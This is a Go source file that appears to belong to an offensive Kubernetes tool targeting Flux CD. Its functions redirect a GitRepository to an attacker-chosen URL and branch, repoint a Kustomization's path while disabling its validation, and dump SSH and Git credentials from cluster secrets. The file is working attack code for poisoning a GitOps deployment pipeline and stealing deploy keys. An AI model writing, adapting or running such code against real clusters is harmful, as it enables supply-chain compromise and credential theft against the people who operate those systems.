package cicd

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var (
	fluxGitRepoGVR = schema.GroupVersionResource{
		Group: "source.toolkit.fluxcd.io", Version: "v1", Resource: "gitrepositories",
	}
	fluxKustomizationGVR = schema.GroupVersionResource{
		Group: "kustomize.toolkit.fluxcd.io", Version: "v1", Resource: "kustomizations",
	}
	fluxHelmReleaseGVR = schema.GroupVersionResource{
		Group: "helm.toolkit.fluxcd.io", Version: "v2", Resource: "helmreleases",
	}
)

func PoisonFluxGitSource(ctx context.Context, dynClient dynamic.Interface, ns, name, repoURL, branch string) (*PoisonResult, error) {
	result := &PoisonResult{
		Platform: "flux",
		Action:   "poison_source",
		Target:   name,
	}

	gitRepo, err := dynClient.Resource(fluxGitRepoGVR).Namespace(ns).Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("failed to get gitrepository: %v", err)
		return result, nil
	}

	if repoURL != "" {
		if err := unstructured.SetNestedField(gitRepo.Object, repoURL, "spec", "url"); err != nil {
			result.Output = fmt.Sprintf("failed to set url: %v", err)
			return result, nil
		}
	}

	if branch != "" {
		if err := unstructured.SetNestedField(gitRepo.Object, branch, "spec", "ref", "branch"); err != nil {
			result.Output = fmt.Sprintf("failed to set branch: %v", err)
			return result, nil
		}
	}

	_, err = dynClient.Resource(fluxGitRepoGVR).Namespace(ns).Update(ctx, gitRepo, metav1.UpdateOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("update failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Output = fmt.Sprintf("modified gitrepository %s (url=%s, branch=%s)", name, repoURL, branch)
	return result, nil
}

func PoisonFluxKustomization(ctx context.Context, dynClient dynamic.Interface, ns, name, path string) (*PoisonResult, error) {
	result := &PoisonResult{
		Platform: "flux",
		Action:   "poison_kustomization",
		Target:   name,
	}

	ks, err := dynClient.Resource(fluxKustomizationGVR).Namespace(ns).Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("failed to get kustomization: %v", err)
		return result, nil
	}

	if path != "" {
		if err := unstructured.SetNestedField(ks.Object, path, "spec", "path"); err != nil {
			result.Output = fmt.Sprintf("failed to set path: %v", err)
			return result, nil
		}
	}

	if err := unstructured.SetNestedField(ks.Object, false, "spec", "validation"); err == nil {
		// disabled validation
	}

	_, err = dynClient.Resource(fluxKustomizationGVR).Namespace(ns).Update(ctx, ks, metav1.UpdateOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("update failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Output = fmt.Sprintf("modified kustomization %s (path=%s, validation disabled)", name, path)
	return result, nil
}

func StealFluxCredentials(ctx context.Context, client kubernetes.Interface, ns string) (string, error) {
	var sb strings.Builder
	sb.WriteString("Flux Source Credentials:\n")

	secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
	if err != nil {
		return "", fmt.Errorf("failed to list secrets: %w", err)
	}

	gitKeywords := []string{"git", "flux", "source", "deploy-key", "ssh"}
	for _, s := range secrets.Items {
		nameMatch := false
		for _, kw := range gitKeywords {
			if strings.Contains(strings.ToLower(s.Name), kw) {
				nameMatch = true
				break
			}
		}
		if !nameMatch {
			continue
		}

		fmt.Fprintf(&sb, "  Secret: %s (type=%s)\n", s.Name, s.Type)
		for key, val := range s.Data {
			if containsSensitive(key) || strings.Contains(key, "ssh") || strings.Contains(key, "identity") {
				fmt.Fprintf(&sb, "    %s: %s...\n", key, string(val[:min(100, len(val))]))
			}
		}
	}

	return sb.String(), nil
}

func ListFluxResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
	var sb strings.Builder

	repos, err := ListCRDs(ctx, dynClient, fluxGitRepoGVR, ns)
	if err == nil {
		fmt.Fprintf(&sb, "GitRepositories (%d):\n", len(repos))
		for _, r := range repos {
			url, _, _ := unstructured.NestedString(r.Object, "spec", "url")
			branch, _, _ := unstructured.NestedString(r.Object, "spec", "ref", "branch")
			fmt.Fprintf(&sb, "  - %s (url=%s branch=%s)\n", r.GetName(), url, branch)
		}
	}

	kustomizations, err := ListCRDs(ctx, dynClient, fluxKustomizationGVR, ns)
	if err == nil {
		fmt.Fprintf(&sb, "Kustomizations (%d):\n", len(kustomizations))
		for _, k := range kustomizations {
			path, _, _ := unstructured.NestedString(k.Object, "spec", "path")
			sourceRef, _, _ := unstructured.NestedString(k.Object, "spec", "sourceRef", "name")
			fmt.Fprintf(&sb, "  - %s (source=%s path=%s)\n", k.GetName(), sourceRef, path)
		}
	}

	helmReleases, err := ListCRDs(ctx, dynClient, fluxHelmReleaseGVR, ns)
	if err == nil {
		fmt.Fprintf(&sb, "HelmReleases (%d):\n", len(helmReleases))
		for _, h := range helmReleases {
			chart, _, _ := unstructured.NestedString(h.Object, "spec", "chart", "spec", "chart")
			version, _, _ := unstructured.NestedString(h.Object, "spec", "chart", "spec", "version")
			fmt.Fprintf(&sb, "  - %s (chart=%s version=%s)\n", h.GetName(), chart, version)
		}
	}

	return sb.String(), nil
}
